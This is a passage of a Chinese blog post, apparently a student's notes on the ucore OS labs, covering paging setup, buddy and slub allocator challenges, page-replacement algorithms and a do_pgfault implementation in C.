 0xC0000000</span><br><span class="hljs-comment">// 修改后</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE            0x0</span><br></code></pre></div></td></tr></table></figure></li><li><p>最后一步，但也是必须要做的一步——<strong>关闭页机制</strong>。将开启页机制的那一段代码删除或注释掉最后一句即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># 修改后<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br># 注释了最后一句<br># movl %eax, %cr0<br></code></pre></div></td></tr></table></figure></li><li><p>需要注意的是，需要把开启页表关闭，否则会报错，**因为页表开启时认为偏移量不为0(有待考证)**。</p></li></ul><h3 id="拓展练习-1"><a href="#拓展练习-1" class="headerlink" title="拓展练习"></a>拓展练习</h3><h4 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h4><blockquote><p><strong>buddy system（伙伴系统）分配算法, <a href="http://coolshell.cn/articles/10427.html">伙伴分配器的一个极简实现</a> <a href="https://github.com/wuwenbin/buddy2/blob/master/buddy2.c">具体实现</a></strong></p><p>Buddy System算法把系统中的可用存储空间划分为存储块(Block)来进行管理, 每个存储块的大小必须是2的n次幂(Pow(2, n)), 即1, 2, 4, 8, 16, 32, 64, 128…</p></blockquote><p>经过一番思考, 属于是没搞懂用在这里的优势在哪, 分配的时候得遍历一遍双向链表, 找到了再分割, 和FIFO没啥区别, 释放时稍微有一点优势,  但最主要的问题是如果内存探测弄出的block很多的话也就只有略微有一点优势, 至于用双向链表而不是二叉树就更离谱了, 不如不写</p><h4 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h4><blockquote><p>slub算法，实现两层架构的高效内存单元分配，第一层是基于页大小的内存分配，第二层是在第一层基础上实现基于任意大小的内存分配。可简化实现，能够体现其主体思想即可。</p><ul><li>参考<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-slub/">linux的slub分配算法/</a>，在ucore中实现slub分配算法。要求有比较充分的测试用例说明实现的正确性，需要有设计文档。</li></ul></blockquote><h1 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成"><a href="#0-项目组成" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验二，实验三主要改动如下：</p><ul><li>kern/mm/default_pmm.[ch]：实现基于struct pmm_manager类框架的Fist-Fit物理内存分配参考实现（分配最小单位为页，即4096字节），相关分配页和释放页等实现会间接被kmalloc/kfree等函数使用。</li><li>kern/mm/pmm.[ch]：pmm.h定义物理内存分配类框架struct pmm_manager。pmm.c包含了对此物理内存分配类框架的访问，以及与建立、修改、访问页表相关的各种函数实现。在本实验中会用到kmalloc/kfree等函数。</li><li>libs/list.h：定义了通用双向链表结构以及相关的查找、插入等基本操作，这是建立基于链表方法的物理内存管理（以及其他内核功能）的基础。在lab0文档中有相关描述。其他有类似双向链表需求的内核功能模块可直接使用list.h中定义的函数。在本实验中会多次用到插入，删除等操作函数。</li><li>kern/driver/ide.[ch]：定义和实现了内存页swap机制所需的磁盘扇区的读写操作支持；在本实验中会涉及通过swapfs_*函数间接使用文件中的函数。故了解即可。</li><li>kern/fs/*：定义和实现了内存页swap机制所需从磁盘读数据到内存页和写内存数据到磁盘上去的函数 swapfs_read/swapfs_write。在本实验中会涉及使用这两个函数。</li><li>kern/mm/memlayout.h：修改了struct Page，增加了两项pra_*成员结构，其中pra_page_link可以用来建立描述各个页访问情况（比如根据访问先后）的链表。在本实验中会涉及使用这两个成员结构，以及le2page等宏。</li><li>kern/mm/vmm.[ch]：vmm.h描述了mm_struct，vma_struct等表述可访问的虚存地址访问的一些信息，下面会进一步详细讲解。vmm.c涉及mm,vma结构数据的创建/销毁/查找/插入等函数，这些函数在check_vma、check_vmm等中被使用，理解即可。而page fault处理相关的do_pgfault函数是本次实验需要涉及完成的。</li><li>kern/mm/swap.[ch]：定义了实现页替换算法类框架struct swap_manager。swap.c包含了对此页替换算法类框架的初始化、页换入/换出等各种函数实现。重点是要理解何时调用swap_out和swap_in函数。和如何在此框架下连接具体的页替换算法实现。check_swap函数以及被此函数调用的_fifo_check_swap函数完成了对本次实验中的练习2：FIFO页替换算法基本正确性的检查，可了解，便于知道为何产生错误。</li><li>kern/mm/swap_fifo.[ch]：FIFO页替换算法的基于页替换算法类框架struct swap_manager的简化实现，主要被swap.c的相关函数调用。重点是_fifo_map_swappable函数（可用于建立页访问属性和关系，比如访问时间的先后顺序）和_fifo_swap_out_victim函数（可用于实现挑选出要换出的页），当然换出哪个页需要借助于fifo_map_swappable函数建立的某种属性关系，已选出合适的页。</li><li>kern/mm/mmu.h：其中定义了页表项的各种属性位，比如PTE_P\PET_D\PET_A等，对于实现扩展实验的clock算法会有帮助。</li></ul><p>本次实验的主要练习集中在vmm.c中的do_pgfault函数和swap_fifo.c中的_fifo_map_swappable函数、_fifo_swap_out_victim函数。</p><h3 id="1-实验执行流程概述"><a href="#1-实验执行流程概述" class="headerlink" title="1.实验执行流程概述"></a>1.实验执行流程概述</h3><p>首先是初始化过程。参考ucore总控函数init的代码，可以看到在调用完成虚拟内存初始化的vmm_init函数之前，需要首先调用pmm_init函数完成物理内存的管理，这也是我们lab2已经完成的内容。接着是执行中断和异常相关的初始化工作，即调用pic_init函数和idt_init函数等，这些工作与lab1的中断异常初始化工作的内容是相同的。</p><p>在调用完idt_init函数之后，将进一步调用三个lab3中才有的新函数vmm_init、ide_init和swap_init。这三个函数涉及了本次实验中的两个练习。第一个函数vmm_init是检查我们的练习1是否正确实现了。为了表述不在物理内存中的“合法”虚拟页，需要有数据结构来描述这样的页，为此ucore建立了mm_struct和vma_struct数据结构（接下来的小节中有进一步详细描述），假定我们已经描述好了这样的“合法”虚拟页，当ucore访问这些“合法”虚拟页时，会由于没有虚实地址映射而产生页访问异常。如果我们正确实现了练习1，则do_pgfault函数会申请一个空闲物理页，并建立好虚实映射关系，从而使得这样的“合法”虚拟页有实际的物理页帧对应。这样练习1就算完成了。</p><p>ide_init和swap_init是为练习2准备的。由于页面置换算法的实现存在对硬盘数据块的读写，所以ide_init就是完成对用于页换入换出的硬盘（简称swap硬盘）的初始化工作。完成ide_init函数后，ucore就可以对这个swap硬盘进行读写操作了。swap_init函数首先建立swap_manager，swap_manager是完成页面替换过程的主要功能模块，其中包含了页面置换算法的实现（具体内容可参考5小节）。然后会进一步调用执行check_swap函数在内核中分配一些页，模拟对这些页的访问，这会产生页访问异常。如果我们正确实现了练习2，就可通过do_pgfault来调用swap_map_swappable函数来查询这些页的访问情况并间接调用实现页面置换算法的相关函数，把“不常用”的页换出到磁盘上。</p><h3 id="2-置换算法"><a href="#2-置换算法" class="headerlink" title="2.置换算法"></a>2.置换算法</h3><p>操作系统迟早会碰到没有内存空闲空间而必须要置换出内存中某个“不常用”的页的情况。如何判断内存中哪些是“常用”的页，哪些是“不常用”的页，把“常用”的页保持在内存中，在物理内存空闲空间不够的情况下，把“不常用”的页置换到硬盘上就是页替换算法着重考虑的问题。容易理解，一个好的页替换算法会导致页访问异常次数少，也就意味着访问硬盘的次数也少，从而使得应用程序执行的效率就高。本次实验涉及的页替换算法（包括扩展练习）：</p><ul><li>先进先出(First In First Out, FIFO)页替换算法：该算法总是淘汰最先进入内存的页，即选择在内存中驻留时间最久的页予以淘汰。只需把一个应用程序在执行过程中已调入内存的页按先后次序链接成一个队列，队列头指向内存中驻留时间最久的页，队列尾指向最近被调入内存的页。这样需要淘汰页时，从队列头很容易查找到需要淘汰的页。FIFO算法只是在应用程序按线性顺序访问地址空间时效果才好，否则效率不高。因为那些常被访问的页，往往在内存中也停留得最久，结果它们因变“老”而不得不被置换出去。FIFO算法的另一个缺点是，它有一种异常现象（Belady现象），即在增加放置页的页帧的情况下，反而使页访问异常次数增多。</li><li>时钟（Clock）页替换算法：是LRU算法的一种近似实现。时钟页替换算法把各个页面组织成环形链表的形式，类似于一个钟的表面。然后把一个指针（简称当前指针）指向最老的那个页面，即最先进来的那个页面。另外，时钟算法需要在页表项（PTE）中设置了一位访问位来表示此页表项对应的页当前是否被访问过。当该页被访问时，CPU中的MMU硬件将把访问位置“1”。当操作系统需要淘汰页时，对当前指针指向的页所对应的页表项进行查询，如果访问位为“0”，则淘汰该页，如果该页被写过，则还要把它换出到硬盘上；如果访问位为“1”，则将该页表项的此位置“0”，继续访问下一个页。该算法近似地体现了LRU的思想，且易于实现，开销少，需要硬件支持来设置访问位。时钟页替换算法在本质上与FIFO算法是类似的，不同之处是在时钟页替换算法中跳过了访问位为1的页。</li><li>改进的时钟（Enhanced Clock）页替换算法：在时钟置换算法中，淘汰一个页面时只考虑了页面是否被访问过，但在实际情况中，还应考虑被淘汰的页面是否被修改过。因为<strong>淘汰修改过的页面还需要写回硬盘(迷惑, 移到swap分区跟是否修改过有什么关系)<strong>，使得其置换代价大于未修改过的页面，所以优先淘汰没有修改的页，减少磁盘操作次数。改进的时钟置换算法除了考虑页面的访问情况，还需考虑页面的修改情况。即该算法不但希望淘汰的页面是最近未使用的页，而且还希望被淘汰的页是在主存驻留期间其页面内容未被修改过的。这需要为每一页的对应页表项内容中增加一位引用位和一位修改位。当该页被访问时，CPU中的MMU硬件将把访问位置“1”。当该页被“写”时，CPU中的MMU硬件将把修改位置“1”。这样这两位就存在四种可能的组合情况：（0，0）表示最近未被引用也未被修改，首先选择此页淘汰；（0，1）最近未被使用，但被修改，其次选择；（1，0）最近使用而未修改，再次选择；（1，1）最近使用且修改，最后选择。该算法与时钟算法相比，可进一步减少磁盘的I/O操作次数，但为了查找到一个尽可能适合淘汰的页面，</strong>可能需要经过多次扫描，增加了算法本身的执行开销</strong>。</li></ul><h3 id="3-相关数据结构"><a href="#3-相关数据结构" class="headerlink" title="3.相关数据结构"></a>3.相关数据结构</h3><blockquote><p>Typoar给我整了个崩溃, 我也崩溃了⊙▃⊙以下内容直至challenge前复制于<a href="https://kiprey.github.io/2020/08/uCore-3/#3-uCore%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AE%9E%E7%8E%B0">这里</a> </p></blockquote><h4 id="I-虚拟内存管理"><a href="#I-虚拟内存管理" class="headerlink" title="I. 虚拟内存管理"></a>I. 虚拟内存管理</h4><ul><li><p>结构体变量<code>check_mm_struct</code>用于管理虚拟内存页面，其结构体如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// the control struct for a set of vma using the same PDT</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> mmap_list;        <span class="hljs-comment">// 按照虚拟地址顺序双向连接的虚拟页链表</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">mmap_cache</span>;</span> <span class="hljs-comment">// 当前使用的虚拟页地址，该成员加速页索引速度。</span><br>    <span class="hljs-keyword">pde_t</span> *pgdir;                  <span class="hljs-comment">// 虚拟页对应的PDT</span><br>    <span class="hljs-keyword">int</span> map_count;                 <span class="hljs-comment">// 虚拟页个数</span><br>    <span class="hljs-keyword">void</span> *sm_priv;                 <span class="hljs-comment">// 用于指向swap manager的某个链表,在FIFO算法中，该双向链表用于将可交换的已分配物理页串起来</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>当分配出新的虚拟页时，程序会执行<code>insert_vma_struct</code>函数，此时虚拟页<code>vma_struct</code>就会被插入<code>mm_struct::mmap_list</code>双向链表中。</p></li><li><p>若程序首次访问该内存而触发缺页中断时，程序会在缺页处理程序中为该虚拟页划分出一块新的物理页。同时，还会更新<code>mm_struct::pgdir</code>上的对应页表条目，之后该页的内存访问即可正常执行。</p></li><li><p>在FIFO页面置换算法中，初始时，<code>mm_struct</code>中的<code>sm_priv</code>会被设置为<code>pra_list_head</code>。而<code>pra_list_head</code>是一个双向链表的起始结点，该双向链表用于将<strong>可交换的已分配物理页</strong>串起来。</p></li></ul><h4 id="II-页面置换"><a href="#II-页面置换" class="headerlink" title="II. 页面置换"></a>II. 页面置换</h4><ul><li><p><code>swap_manager</code>与<code>pmm_manager</code>类似，都设置了一个用于管理某个功能的模块。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">swap_manager</span></span><br><span class="hljs-class">&#123;</span><br>     <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>     <span class="hljs-comment">/* Global initialization for the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*init)            (<span class="hljs-keyword">void</span>);<br>     <span class="hljs-comment">/* Initialize the priv data inside mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*init_mm)         (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when tick interrupt occured */</span><br>     <span class="hljs-keyword">int</span> (*tick_event)      (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when map a swappable page into the mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*map_swappable)   (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page *page, <span class="hljs-keyword">int</span> swap_in);<br>     <span class="hljs-comment">/* When a page is marked as shared, this routine is called to</span><br><span class="hljs-comment">      * delete the addr entry from the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*set_unswappable) (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr);<br>     <span class="hljs-comment">/* Try to swap out a page, return then victim */</span><br>     <span class="hljs-keyword">int</span> (*swap_out_victim) (struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick);<br>     <span class="hljs-comment">/* check the page relpacement algorithm */</span><br>     <span class="hljs-keyword">int</span> (*check_swap)(<span class="hljs-keyword">void</span>);<br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>若使用FIFO页面置换算法，则在缺页中断程序中，程序只会<strong>换入</strong>目标物理页，而不会主动换出。</p><p>只有在分配空闲物理页时，若<code>pmm_manager-&gt;alloc_pages(n)</code>失败，则程序才会执行一次页面换出，以腾出空闲的物理页，并重新分配。</p></li><li><p><code>swap_in</code>函数只会将目标物理页加载进内存中，而不会修改页表条目。所以相关的标志位设置必须在<code>swap_in</code>函数的外部手动处理。而<code>swap_out</code>函数会先执行<code>swap_out_victim</code>，找出最适合换出的物理页，并将其换出，最后刷新TLB, <strong>有可能换出多页</strong>。需要注意的是<code>swap_out</code>函数会在函数内部设置PTE，当某个页面被换出后，PTE会被设置为所换出物理页在硬盘上的偏移, 而且会执行<strong>free_page</strong>, 往空闲链表里面加入该page</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cprintf(<span class="hljs-string">&quot;swap_out: i %d, store page in vaddr 0x%x to disk swap entry %d\n&quot;</span>, i, v, page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>);<br>*ptep = (page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">8</span>;<br>free_page(page);<br></code></pre></div></td></tr></table></figure><p>当PTE所对应的物理页存在于内存中，那么该PTE就是正常的页表条目，可被CPU直接寻址用于转换地址。但当所对应的物理页不在内存时，该PTE就成为<code>swap_entry_t</code>，保存该物理页数据在外存的偏移位置。相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * swap_entry_t</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> * |         offset        |   reserved   | 0 |</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> *           24 bits            7 bits    1 bit</span><br><span class="hljs-comment"> * /</span><br><span class="hljs-comment"> /* *</span><br><span class="hljs-comment"> * swap_offset - takes a swap_entry (saved in pte), and returns</span><br><span class="hljs-comment"> * the corresponding offset in swap mem_map.</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> swap_offset(entry) (&#123;                                       \</span><br><span class="hljs-meta">               size_t __offset = (entry &gt;&gt; 8);                        \</span><br><span class="hljs-meta">               <span class="hljs-meta-keyword">if</span> (!(__offset &gt; 0 &amp;&amp; __offset &lt; max_swap_offset)) &#123;    \</span><br><span class="hljs-meta">                    panic(<span class="hljs-meta-string">&quot;invalid swap_entry_t = %08x.\n&quot;</span>, entry);    \</span><br><span class="hljs-meta">               &#125;                                                    \</span><br><span class="hljs-meta">               __offset;                                            \</span><br><span class="hljs-meta">          &#125;)</span><br></code></pre></div></td></tr></table></figure></li><li><p>同时，不是所有物理页面都可以置换，例如内核关键代码和数据等等，所以在分配物理页时，需要对于那些可被置换的物理页执行<code>swap_map_swappable</code>函数，将该物理页加入到<code>mm_struct::sm_priv</code>指针所指向的双向链表中，换入和换出操作都会操作该链表（插入/移除<strong>可交换的已分配</strong>物理页）。</p></li><li><p>数据结构<code>Page</code>和<code>vma_struct</code>分别用于管理物理页和虚拟页，其结构如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 用于描述某个虚拟页的结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span> <span class="hljs-comment">// 管理该虚拟页的mm_struct</span><br>    <span class="hljs-keyword">uintptr_t</span> vm_start;      <span class="hljs-comment">// 虚拟页起始地址，包括当前地址  </span><br>    <span class="hljs-keyword">uintptr_t</span> vm_end;        <span class="hljs-comment">// 虚拟页终止地址，不包括当前地址（地址前闭后开）  </span><br>    <span class="hljs-keyword">uint32_t</span> vm_flags;       <span class="hljs-comment">// 相关标志位</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;  <span class="hljs-comment">// 用于连接各个虚拟页的双向指针</span><br>&#125;;<br><br><span class="hljs-comment">// 数据结构Page相关成员的用途已在uCore-2中介绍过，这里只提它新增的两个成员pra_*</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;<br>    <span class="hljs-keyword">uint32_t</span> flags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<br>    <span class="hljs-keyword">list_entry_t</span> page_link;<br>    <span class="hljs-keyword">list_entry_t</span> pra_page_link;     <span class="hljs-comment">// 用于连接上一个和下一个*可交换已分配*的物理页</span><br>    <span class="hljs-keyword">uintptr_t</span> pra_vaddr;            <span class="hljs-comment">// 用于保存该物理页所对应的虚拟地址。</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>当分配某个虚拟页<code>vma_struct</code>时，程序会在<code>insert_vma_struct</code>函数中设置其<code>vm_mm</code>成员为某个<code>mm_struct</code>，这样便于后续的管理。</li><li>在函数<code>pgdir_alloc_page</code>中，程序会设置<code>Page</code>的<code>pra_vaddr</code>成员，将其设置为当前物理页所对应的虚拟地址，之后便可通过<code>Page-&gt;pra_vaddr-&gt;pte</code>一条链，直接找到当前<strong>物理页</strong>地址所对应的PTE条目。同时，也可通过<code>pra_vaddr</code>来确定对应外存的相对偏移<code>page-&gt;pra_vaddr/PGSIZE+1</code>。</li><li><code>Page::page_link</code>用于将空闲物理页连接至双向链表中，而<code>page::pra_page_link</code>用于将<strong>可交换的已分配</strong>物理页连接至另一个双向链表中，注意两者的用途是不同的。</li></ul></li></ul><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="练习0"><a href="#练习0" class="headerlink" title="练习0"></a>练习0</h3><blockquote><p><strong>填写已有实验</strong> </p></blockquote><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p><strong>给未被映射的地址映射上物理页</strong></p><p>完成do_pgfault（mm/vmm.c）函数，给未被映射的地址映射上物理页。设置访问权限 的时候需要参考页面所在 VMA 的权限，同时需要注意映射物理页时需要操作内存控制 结构所指定的页表，而不是内核的页表。</p></blockquote><p>实验代码如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_INVAL;<br>    <span class="hljs-comment">// 获取触发pgfault的虚拟地址所在虚拟页</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">vma</span> =</span> find_vma(mm, addr);<br><br>    pgfault_num++;<br>    <span class="hljs-comment">// 如果当前访问的虚拟地址不在已经分配的虚拟页中</span><br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;\<br>        cprintf(<span class="hljs-string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 检测错误代码。这里的检测不涉及特权判断。</span><br>    <span class="hljs-keyword">switch</span> (error_code &amp; <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">// 写，同时存在物理页，则写时复制</span><br>        <span class="hljs-comment">// 需要注意的是，default会执行case2的代码，也就是判断是否有写权限。</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-comment">// 同时如果当前操作是写入，但所在虚拟页不允许写入</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&#x27;s vma cannot write\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=1): read, present */</span><br>        <span class="hljs-comment">// 读，同时存在物理页。那就不可能会调用page fault，肯定哪里有问题，直接failed</span><br>        cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=0): read, not present */</span><br>        <span class="hljs-comment">// 如果当前操作是读取，但所在虚拟页不允许读取或执行</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&#x27;s vma cannot read or exec\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 设置页表条目所对应的权限</span><br>    <span class="hljs-keyword">uint32_t</span> perm = PTE_U;<br>    <span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;<br>        perm |= PTE_W;<br>    &#125;<br>    addr = ROUNDDOWN(addr, PGSIZE);<br>    ret = -E_NO_MEM;<br>    <span class="hljs-keyword">pte_t</span> *ptep=<span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* LAB3 EXERCISE 1: YOUR CODE */</span><br>    <span class="hljs-comment">// 查找当前虚拟地址所对应的页表项</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 如果这个页表项所对应的物理页不存在，则</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 分配一块物理页，并设置页表项</span><br>        <span class="hljs-keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* LAB3 EXERCISE 2: YOUR CODE */</span><br>        <span class="hljs-comment">// 如果这个页表项所对应的物理页存在，但不在内存中</span><br>        <span class="hljs-comment">// 如果swap已经初始化完成</span><br>        <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>            struct Page *page=<span class="hljs-literal">NULL</span>;<br>            <span class="hljs-comment">// 将目标数据加载到某块新的物理页中。</span><br>            <span class="hljs-comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span><br>            <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>            <span class="hljs-comment">// 